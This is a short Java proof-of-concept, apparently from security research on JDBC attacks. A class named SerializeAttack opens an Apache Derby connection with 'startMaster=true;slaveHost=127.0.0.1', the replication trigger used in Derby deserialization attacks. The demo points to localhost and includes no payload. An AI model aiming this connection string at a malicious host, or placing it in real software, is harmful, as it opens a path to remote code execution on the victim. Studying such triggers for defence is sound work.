package org.example;

import java.sql.Connection;
import java.sql.DriverManager;

/**
 * @author Whoopsunix
 */
public class SerializeAttack {
    public static void main(String[] args) throws Exception {
        Class.forName("org.apache.derby.jdbc.EmbeddedDriver");

        // 数据库初始化
        Connection connection = DriverManager.getConnection("jdbc:derby:webdb;create=true");
        System.out.println(connection.getMetaData().getURL());

        DriverManager.getConnection("jdbc:derby:webdb;startMaster=true;slaveHost=127.0.0.1");
    }
}
